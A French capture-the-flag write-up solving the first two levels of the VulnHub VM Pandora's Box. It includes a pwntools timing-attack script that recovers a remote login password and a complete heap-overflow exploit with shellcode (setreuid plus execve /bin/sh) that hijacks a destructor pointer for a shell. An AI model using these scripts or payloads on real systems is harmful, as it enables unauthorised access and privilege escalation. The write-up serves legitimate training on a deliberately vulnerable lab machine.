# Solution du CTF Pandora's Box de VulnHub (levels 1 et 2)

[Pandora's Box](https://vulnhub.com/entry/pandoras-box-1,111/) est un autre de ces vieux CTF (janvier 2015) provenant de VulnHub mais pas des moindres.

La description indique qu'il est centré sur l'exploitation de binaire. Qui dit exploitation de binaire dit reverse-engineering, dit code assembleur, code d'exploitation et par conséquent article de 3km donc je vais couper le CTF en plusieurs parties (en espérant que je parvienne jusqu'au boût).

Voici déjà les solutions des deux premiers niveaux. Indice pour le tout premier : temporisation.

```
Nmap scan report for 192.168.56.83
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 0e0d5d50f27c74075b6f3f63904260eb (DSA)
|   2048 8828b92f201ac4ded27e64382b5648ad (RSA)
|_  256 3b5178ac21260de4aac475cc7d6c0bf3 (ECDSA)
54311/tcp open  nagios-nsca Nagios NSCA
MAC Address: 08:00:27:EA:AD:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok.... Et pas de ports ouverts pour UDP.

## Rien ne sert de courir ; il faut partir à point.

Le port détecté comme Nagios est en réalité un service custom :

```shellsession
$ ncat 192.168.56.83 54311 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.83:54311.
#######################
# Secure Remote Shell #
#######################
Welcome, please log in
Password: password
Invalid password!
Password: admin
Invalid password!
Password: 123456
Invalid password!
Password: letmein
Invalid password!
```

J'ai écrit un script Python simple pour tenter de casser le mot de passe avec une wordlist :

```python
import sys
from pwnlib.tubes.remote import remote

r = remote("192.168.56.83", 54311)
buff = r.recvuntilS(b"Password: ")
with open(sys.argv[1], encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        r.send(line)
        response = r.readlineS().strip()
        if response != "Invalid password!":
            print(f"Possibly found password {line.strip()}: {response}")
            break
        r.recvuntilS(b"Password: ")
r.close()
```

J'ai testé avec la wordlist rockyou mais ça n'a rien trouvé ! Le programme ne semble pas non plus vulnérable à une format string.

Finalement j'ai trouvé un indice sur le web : le programme répond moins vite pour chaque mauvais caractère saisi.

J'ai donc adapté mon code de cette façon :

```python
import sys
import string
from time import monotonic

from pwnlib.tubes.remote import remote

password = ""
while True:
    r = remote("192.168.56.83", 54311)
    buff = r.recvuntilS(b"Password: ")
    min_time = 60
    good_letter = "²"

    for char in string.printable.strip():
        line = password + char + "\n"
        start = monotonic()
        r.send(line)
        response = r.readlineS().strip()
        delay = monotonic() - start
        if delay < min_time:
            min_time = delay
            good_letter = char

        if response != "Invalid password!":
            print(f"Possibly found password {line.strip()}: {response}")
            sys.exit()
        r.recvuntilS(b"Password: ")

    password += good_letter
    print(password)
    r.close()
```

Je teste pour chaque position tous les caractères ascii affichables et je conserve celui qui a généré le moins de délais.

Je réitère ensuite l'opération pour le suivant. L'output ressemble à ceci :

```
R
R3
R3s
--- snip ---
R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG
R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0
Possibly found password R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d: Logged in successfully, type exit to close the shell
```

On a effectivement un shell avec ce mot de passe :

```shellsession
$ ncat 192.168.56.83 54311 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.83:54311.
#######################
# Secure Remote Shell #
#######################
Welcome, please log in
Password: R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
Logged in successfully, type exit to close the shell
Shell$ id
uid=1001(level1) gid=1001(level1) groups=1001(level1)
Shell$ ls -alh
total 44K
drwxr-x--- 2 level1 level1 4.0K Jan  4  2015 .
drwxr-xr-x 7 root   root   4.0K Jan  3  2015 ..
-rw-r--r-- 1 level1 level1  220 Jan  3  2015 .bash_logout
-rw-r--r-- 1 level1 level1 3.5K Jan  3  2015 .bashrc
-rwsr-xr-x 1 level2 level1 8.9K Jan  4  2015 level2
-rw-r--r-- 1 level1 level1  145 Jan  4  2015 level2_readme.txt
-rw-r--r-- 1 level1 level1  675 Jan  3  2015 .profile
-rw-rw-r-- 1 level1 level1   66 Jan  3  2015 .selected_editor
-rw------- 1 level1 level1  662 Jan  3  2015 .viminfo
```

Malheureusement pas de mot de passe pour le SSH. De plus, placer une clé SSH dans le `authorized_keys` n'a pas d'effet.

Je peux toutefois uploader et exécuter `reverse-sshx86` qui me donne l'équivalent d'un serveur SSH sur le port 31337.

Le nombre de levels semble assez court. Reste à savoir si on doit passer par l'utilisateur `pandora`. On peut s'attendre aussi à ce qu'il y ait un setuid root à un moment. Soit 6 binaires à exploiter au maximum.

```
pandora:x:1000:1000:pandora,,,:/home/pandora:/bin/bash
level1:x:1001:1001:,,,:/home/level1:/bin/bash
level2:x:1002:1002:,,,:/home/level2:/bin/bash
level3:x:1003:1003:,,,:/home/level3:/bin/bash
level4:x:1004:1004:,,,:/home/level4:/bin/bash
```

## Carnet de notes

On a donc un binaire setuid level 2 à exploiter et ça pue l'exploitation du heap à plein nez avec un jeu de commandes de création / suppressions / affichage :

```shellsession
level1@pb0x:/home/level1$ ./level2 
[*] Notes manager - 1.0
[*] Type help for the command list
> help
Command list:
        Create new note     : new
        Set note text       : set
        Show note text      : show
        Delete note         : del
        Show commands       : help
        Exit                : exit
> show
> id: 0
[!] Note id 0 doesnt exist
> show 
> id: 1
[!] Note id 1 doesnt exist
> show
> id: -1
Segmentation fault (core dumped)
```

Je spot direct un crash si on demande une note dont l'index est négatif :D

A part ça, ça semble plutôt protégé (du genre pas de double suppression, pas d'édition ni d'affichage, si la note n'existe pas) :

```shellsession
level1@pb0x:/home/level1$ ./level2 
[*] Notes manager - 1.0
[*] Type help for the command list
> new
[*] New note created with id 0
> set
> id: 0
> text(32 max): yolo
[*] Note 0 set
> del
> id: 0
[*] Note 0 deleted
> set
> id: 0
[!] Note id 0 doesnt exist
> show
> id: 0
[!] Note id 0 doesnt exist
> new
[*] New note created with id 0
> show
> id: 0
[*] Note 0 text: yolo
> del
> id: 0
[*] Note 0 deleted
> del
> id: 0
[!] Note id 0 doesnt exist
```

On voit tout de même que si on créé une note après en avoir supprimé une on retrouve le précédent contenu dont le cleanup n'est pas complet.

Voyons voir si on écrase la notre existante par quelque chose de plus grand avant de déclencher la suppression :

```
[*] New note created with id 0
> set
> id: 0
> text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Note 0 set
> del
> id: 0
*** glibc detected *** ./level2: free(): invalid next size (normal): 0x08d70018 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x75f12)[0xb7640f12]
./level2[0x8048892]
./level2[0x8048d92]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb75e44e3]
./level2[0x8048681]
======= Memory map: ========
08048000-0804a000 r-xp 00000000 08:01 1048708    /home/level1/level2
0804a000-0804b000 rw-p 00001000 08:01 1048708    /home/level1/level2
08d70000-08d71000 rwxp 00000000 00:00 0          [heap]
08d71000-08d91000 rw-p 00000000 00:00 0          [heap]
b75a8000-b75c4000 r-xp 00000000 08:01 131141     /lib/i386-linux-gnu/libgcc_s.so.1
b75c4000-b75c5000 r--p 0001b000 08:01 131141     /lib/i386-linux-gnu/libgcc_s.so.1
b75c5000-b75c6000 rw-p 0001c000 08:01 131141     /lib/i386-linux-gnu/libgcc_s.so.1
b75ca000-b75cb000 rw-p 00000000 00:00 0 
b75cb000-b776f000 r-xp 00000000 08:01 131104     /lib/i386-linux-gnu/libc-2.15.so
b776f000-b7770000 ---p 001a4000 08:01 131104     /lib/i386-linux-gnu/libc-2.15.so
b7770000-b7772000 r--p 001a4000 08:01 131104     /lib/i386-linux-gnu/libc-2.15.so
b7772000-b7773000 rw-p 001a6000 08:01 131104     /lib/i386-linux-gnu/libc-2.15.so
b7773000-b7776000 rw-p 00000000 00:00 0 
b7777000-b777c000 rw-p 00000000 00:00 0 
b777c000-b777d000 r-xp 00000000 00:00 0          [vdso]
b777d000-b779d000 r-xp 00000000 08:01 131097     /lib/i386-linux-gnu/ld-2.15.so
b779d000-b779e000 r--p 0001f000 08:01 131097     /lib/i386-linux-gnu/ld-2.15.so
b779e000-b779f000 rw-p 00020000 08:01 131097     /lib/i386-linux-gnu/ld-2.15.so
bf92a000-bf94b000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)
```

Big badaboum ! La belle faille d'overflow sur le tas !

A ce stade on sait ce qu'il est possible de faire mais on ne sait pas vraiment comment exploiter ça.

Cependant l'autre point nécessaire pour exploiter ce type de vulnérabilité est d'être en mesure de fuiter de la mémoire, surtout que sur la VM l'ASLR est activé.

J'y suis parvenu mais il faut créer une note supplémentaire :

```
level1@pb0x:/home/level1$ ./level2 
[*] Notes manager - 1.0
[*] Type help for the command list
> new
[*] New note created with id 0
> set
> id: 0
> text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Note 0 set
> del  
> id: 0
[*] Note 0 deleted
> new
[*] New note created with id 0
> show  
> id: 0
[*] Note 0 text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> new
[*] New note created with id 1
> show 1
[!] Invalid command, try help
> show
> id: 1
[*] Note 1 text: 
> del
> id: 0
[*] Note 0 deleted
> show
> id: 1
[*] Note 1 text: 
> new
[*] New note created with id 0
> show  
> id: 0
[*] Note 0 text: pn�pn�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Moonwalk

Donc reverse :)

Quand on analyse le binaire avec `Cutter` on voit que la fonction `main` n'appelle pas les `malloc` et `free` directement mais se base sur différentes primitives écrites par l'auteur.

On a la fonction permettant de voir si une note est libre ou non (c'est le code décompilé) :

```c
int32_t slot_exists (int32_t arg_8h, const char * arg_ch) {
    eax = list_size;
    if (arg_ch > eax) {
        eax = 0;
    } else {
        eax = arg_ch;
        edx = eax*4;
        eax = arg_8h;
        eax += edx;
        eax = *(eax);
        if (eax != 0) {
            eax = 1;
        } else {
            eax = 0;
        }
    }
    return eax;
}
```

`list_size` est comme son nom l'indique le nombre maximum de notes. Sa valeur (initialisée à 10) est stockée à l'adresse mémoire `0x8048e94`.

`arg_ch` n'est visiblement pas un `char *` contrairement à ce que le décompilateur indique mais plutôt le numéro de slot demandé. On voit que sa valeur est multipliée par 4 et comme on est sur un système 32 bits ça permet de calculer l'emplacement depuis l'adresse du tableau de pointeurs vers les zones allouées.

Par conséquent le paramètre `arg_8h` correspond à l'adresse du tableau en mémoire vu qu'il sert de base dans le calcul et l'adresse caculée est ensuite déréférencée pour voir si une adresse nulle est présente ou non.

Avec ma maîtrise du langage C (qui a vu des jours meilleurs) j'écrirais la fonction à peut près comme ceci :

```c
int slot_exists(unsigned int **notes, int index) {
    if (index > list_size) return 0;
    note_addr = *notes[index];
    if (note_addr) { return 1; }
    return 0;
}
```

Après il y a une fonction `get_empty_slot` dont le décompilateur a du mal à la transposer correctement mais après lecture du code assembleur on a quelque chose comme ceci :

```c
int * get_empty_slot(int **notes) {
    int i;
    for (i=0; i < list_size; i++) {
        if (*notes[i]) return i;
    }
    return -1;
}
```

Le fonction d'allocation `create_struct` telle que décompilée par `Cutter` est là aussi assez étrange :

```c
uint32_t create_struct (void) {
    void ** size;
    int32_t var_4h;
    int32_t var_8h;
    eax = malloc (8);
    size = eax;
    *(eax) = 0x40;
    eax = size;
    eax = *(eax);
    eax = malloc (eax);
    edx = eax;
    eax = size;
    *((eax + 4)) = edx;
    eax = size;
    eax = *(eax);
    edx = size;
    edx = *((edx + 4));
    edx &= 0xfffff000;
    mprotect (edx, 7, eax);
    eax = size;
    return eax;
}
```

Je la recréerai comme ceci :

```c
unsigned int create_struct(void) {
    unsigned int *note = malloc(8);
    note[0] = 64;
    char * data = malloc(64);
    note[1] = data;
    mprotect(data, 64, PROT_READ|PROT_WRITE|PROT_EXEC);
    return note;
}
```

La structure est donc un pointeur précédée de la taille allouée. Très important, la présence du `mprotect` qui rend l'emplacement mémoire exécutable et donc nous laisse l'occasion d'y poser un shellcode !

Et pour terminer il y a la fonction de libération de la structure qui est très simple :

```c
int32_t free_struct (void * ptr) {
    eax = ptr;
    eax = *((eax + 4));
    free (eax);
    eax = ptr;
    free (eax);
    return eax;
}
```

donc en mode *M. Propre* :

```c
int32_t free_struct (unsigned int * note) {
    free(note[1]);
    free(note);
    return note;
}
```

La vulnérabilité dans le programme réside dans le fait que l'écriture d'une note se fait sans vérifier que l'on est dans la limite des 64 octets alloués. Le programme indique gentiment de ne pas aller au delà de 32 caractères (voir output du programme plus haut) mais aucune vérification n'est en place :

```nasm
0x08048ba3      mov dword [var_sp_ch], 0
0x08048bab      mov dword [base], str.text_32_max_: ; 0x8048ff6 ; const char *arg_8h
0x08048bb3      mov dword [endptr], 0x80 ; 128 ; const char *arg_ch
0x08048bbb      lea eax, [str]
0x08048bc1      mov dword [esp], eax ; const char *arg_10h
0x08048bc4      call readline      ; sym.readline
0x08048bc9      mov eax, dword [var_14h]
0x08048bcc      mov edx, dword [var_18h]
0x08048bcf      mov eax, dword [eax + edx*4]
0x08048bd2      mov dword [var_1ch], eax
0x08048bd5      lea eax, [str]
0x08048bdb      mov dword [esp], eax ; const char *s
0x08048bde      call strlen        ; sym.imp.strlen ; size_t strlen(const char *s)
0x08048be3      mov edx, eax
0x08048be5      mov eax, dword [var_1ch]
0x08048be8      mov dword [eax], edx
0x08048bea      mov eax, dword [var_1ch]
0x08048bed      mov eax, dword [eax]
0x08048bef      mov edx, eax
0x08048bf1      mov eax, dword [var_1ch]
0x08048bf4      mov eax, dword [eax + 4]
0x08048bf7      mov dword [base], edx ; size_t n
0x08048bfb      lea edx, [str]
0x08048c01      mov dword [endptr], edx ; const void *s2
0x08048c05      mov dword [esp], eax ; void *s1
0x08048c08      call memcpy        ; sym.imp.memcpy ; void *memcpy(void *s1, const void *s2, size_t n)
0x08048c0d      mov eax, dword [var_18h]
0x08048c10      mov dword [endptr], eax
0x08048c14      mov dword [esp], str.Note__d_set ; 0x8049007 ; const char *format
0x08048c1b      call printf        ; sym.imp.printf ; int printf(const char *format)
0x08048c20      jmp 0x8048dd5
```

Le programme récupère un buffer via `readline()` puis un `memcpy()` est utilisé pour le recopier dans la note avec en taille le résultat du `strlen()`. Comme `readline()` n'est pas borné alors la recopie non plus.

## Exploit 101

Du coup la technique d'exploitation sera la suivante :

- créer une première note vide (note 0)

- créer une seconde note vide (note 1)

- écrire dans la note 0 pour écraser le pointeur vers la chaine de caractère dans la note 1 par une adresse de notre choix

- écrire dans la note 1 qui permettra d'écrire à l'adresse que l'on a écrasé

C'est un write-what-where.

Soit dans la pratique :

```shellsession
level1@pb0x:/home/level1$ ./level2 
[*] Notes manager - 1.0
[*] Type help for the command list
> new
[*] New note created with id 0
> new
[*] New note created with id 1
> set 
> id: 0
> text(32 max): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] Note 0 set
> set
> id: 1
> text(32 max): nawak
Segmentation fault (core dumped)
level1@pb0x:/home/level1$ dmesg | tail -1
[64445.295726] level2[10442]: segfault at 41414141 ip b769b096 sp bfdf8c28 error 6 in libc-2.15.so[b7560000+1a4000]
```

On voit que l'on a bien un segfault car on a tenté d'écrire à l'adresse `0x41414141` correspondant à nos `A`.

C'est bien beau tout ça mais on écrase quoi par quoi ?

Quand on affiche les adresses de symboles du programme avec `nm` on trouve notamment `__do_global_dtors_aux_fini_array_entry` :

```shellsession
$ nm level2 
0804a3b0 A __bss_start
         U bzero@@GLIBC_2.0
0804a3e4 b completed.5730
08048821 T create_struct
0804a3a8 D __data_start
0804a3a8 W data_start
08048690 t deregister_tm_clones
08048700 t __do_global_dtors_aux
0804a260 d __do_global_dtors_aux_fini_array_entry
0804a3ac D __dso_handle
--- snip ---
08048779 T show_help
0804874c T show_welcome
080488dd T slot_exists
08048660 T _start
0804a3c0 B stdin@@GLIBC_2.0
0804a3e0 B stdout@@GLIBC_2.0
         U strchr@@GLIBC_2.0
         U strcmp@@GLIBC_2.0
080487d5 T stripnewline
         U strlen@@GLIBC_2.0
         U strtol@@GLIBC_2.0
0804a3b0 D __TMC_END__
         U write@@GLIBC_2.0
```

Ce symbole correspond à un tableau de pointeurs sur fonctions qui sont lancées à la fin du programme. C'est grosso-modo des destructeurs (pour reprendre un concept connu en programmation).

A titre d'exemple l'arrêt normal du programme ce fait de cette façon :

```shellsession
$ ./level2 
[*] Notes manager - 1.0
[*] Type help for the command list
> exit
[*] Goodbye
```

Maintenant lançons le binaire avec GDB et plaçons l'adresse de la fonction `show_welcome` en première position de `__do_global_dtors_aux_fini_array_entry` :

```shellsession
$ gdb -q ./level2
Reading symbols from ./level2...

This GDB supports auto-downloading debuginfo from the following URLs:
https://debuginfod.opensuse.org/ 
Enable debuginfod for this session? (y or [n]) n
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./level2)
(gdb) start
Temporary breakpoint 1 at 0x80489b6
Starting program: /tmp/ctf/level2 
Missing separate debuginfos, use: zypper install glibc-32bit-debuginfo-2.36-8.1.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Temporary breakpoint 1, 0x080489b6 in main ()
(gdb) set *0x804a260 = 0x0804874c
(gdb) c
Continuing.
[*] Notes manager - 1.0
[*] Type help for the command list
> exit
[*] Goodbye
[*] Notes manager - 1.0
[*] Type help for the command list
[Inferior 1 (process 11993) exited with code 014]
```

On observe qu'après le message `Goodbye` par défaut la fonction de bienvenue est effectivement affichée ! Success !

## Hammer time

Un readme laissé dans le dossier nous indique de faire l'exploitation en remote :

> Start this level with socat 'socat TCP4-listen:53121,reuseaddr,fork EXEC:./level2' and use netcat or whatever to communicate with it.

Ce sera une petite contrainte supplémentaire peut génante : socat se chargeant de rediriger les entrées / sorties du programme on peut donc utiliser un shellcode classique qui lance simplement un shell.

Maintenant voici le déroulement complet de mon code d'exploitation :

1. Crée une note 0 vide

2. Créé une note 1 vide

3. Ecrit dans la note 0 jusqu'à ce que le contenu du slot 1 (taille de 64 + adresse mémoire) y apparaisse (`memcpy` n'ajoute pas de octet NULL terminal donc les données seront simplement concaténées)

4. De cette manière on récupère l'adresse du `char *` de la note 1

5. On recommence le débordement sur la note 0 mais cette fois pour que le pointeur de la note 1 corresponde à `__do_global_dtors_aux_fini_array_entry`

6. On écrit dans la note 1 donc dans `__do_global_dtors_aux_fini_array_entry`. Ce qu'on écrit c'est l'adresse du pointeur de la note 1 que l'on a fuité

7. On rétablit la mémoire initiale du programme en écrasant l'adresse du pointeur de la note 1 par l'adresse qui avait été originalement allouée

8. On écrit dans la note 1 pour y placer notre shellcode car on connait l'adresse et on sait que la mémoire est exécutable

9. On appelle la commande `exit` ce qui appellera l'adresse de notre shellcode référencé dans `__do_global_dtors_aux_fini_array_entry`

Mon programme d'exploitation se base sur `pwntools` :

```python
from pwn import *
from struct import unpack, pack

setreuid_level2 = (
    b"\x31\xc0"          # xor    eax,eax
    b"\x31\xdb"          # xor    ebx,ebx
    b"\x66\xbb\xea\x03"  # mov    bx,0x3ea
    b"\x89\xd9"          # mov    ecx,ebx
    b"\xb0\x46"          # mov    al,0x46
    b"\xcd\x80"          # int    0x80
)

execve_bash = (
  # shellcode by Marco Ivaldi without setreuid 0
  # https://www.exploit-db.com/shellcodes/13458
  b"\xeb\x1d"
  b"\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
  b"\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  b"\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh"
)


p = remote("192.168.56.83", 53121)
p.readuntil("> ")
p.sendline(b"new")
p.readuntil("> ")
p.sendline(b"new")
p.readuntil("> ")

buff = "A"
leaked = b""
leaking = False
fini_addr = 0x804a260
welcome_addr = 0x0804874c
note1_addr = 0
padding = 0
testing_fini_overwrite = False

while True:
    p.sendline(b"set")
    p.readuntil("> id: ")
    p.sendline(b"0")
    p.readuntil("> text(32 max):")
    p.sendline(buff.encode())
    p.readuntil("[*] Note 0 set")
    p.readuntil("> ")
    p.sendline(b"show")
    p.readuntil("> id: ")
    p.sendline(b"0")
    line = p.readuntil("> ").split(b"[*] Note 0 text: ")[1][:-3]
    if not leaking:
        if b"@" in line:
            leaking = True
            leaked += b"@"
            padding = len(buff)
    else:
        leaked += line[len(buff):][:1] or b"\x00"
        if len(leaked) >= 8:
            note1_addr = unpack("<I", leaked[4:8])[0]
            print(f"Note #1 addr: 0x{note1_addr:08x}")
            break
    buff += "A"

p.sendline(b"set")
p.readuntil("> id: ")
p.sendline(b"0")
p.readuntil("> text(32 max):")
# Set note #1 buffer address to __do_global_dtors_aux_fini_array_entry
p.sendline(b"A"*padding + b"BBBB" + pack("<I", fini_addr))
p.readuntil("[*] Note 0 set")
p.readuntil("> ")

p.sendline(b"set")
p.readuntil("> id: ")
p.sendline(b"1")
p.readuntil("> text(32 max):")

if testing_fini_overwrite:
    # Put welcome function address as destructor
    p.sendline(pack("<I", welcome_addr))
    p.readuntil("[*] Note 1 set")
    p.readuntil("> ")
    p.sendline(b"exit")
    print(p.readall().decode())
else:
    # The real thing, destructor will launch what's inside out note #1                                               
    p.sendline(pack("<I", note1_addr))
    p.readuntil("[*] Note 1 set")
    p.readuntil("> ")
    # Good, now restore structure to the original address
    p.sendline(b"set")
    p.readuntil("> id: ")
    p.sendline(b"0")
    p.readuntil("> text(32 max):")
    p.sendline(b"A"*padding + b"BBBB" + pack("<I", note1_addr))
    p.readuntil("[*] Note 0 set")
    p.readuntil("> ")
    # Let's put out shellcode in note #1
    p.sendline(b"set")
    p.readuntil("> id: ")
    p.sendline(b"1")
    p.readuntil("> text(32 max):")
    p.sendline(setreuid_level2 + execve_bash)
    # p.sendline(b"\xCC" * 64)  # sigtrap for debugging
    p.readuntil("[*] Note 1 set")
    p.readuntil("> ")
    p.sendline(b"exit")
    p.interactive()
```

Sur la partie d'obtention de l'adresse fuitée je regarde si j'obtient un `@` dans l'output car ça correspond au caractère ascii pour la valeur 64 (soit la taille écrit dans le slot).

Je compte 8 octets à fuiter à partir de là soit le 64 sur 32 bits + l'adresse du pointeur.

Mon shellcode se compose d'un `setreuid(1002, 1002)` correspondant à l'UID de l'utilisateur `level2` puis d'un execve `/bin/sh`.

Ca glisse :

```shellsession
$ python remote_pandora.py 
[+] Opening connection to 192.168.56.83 on port 53121: Done
Note #1 addr: 0x09a89070
[*] Switching to interactive mode
$ id
uid=1002(level2) gid=1001(level1) groups=1002(level2),1001(level1)
```

*Publié le 24 décembre 2022*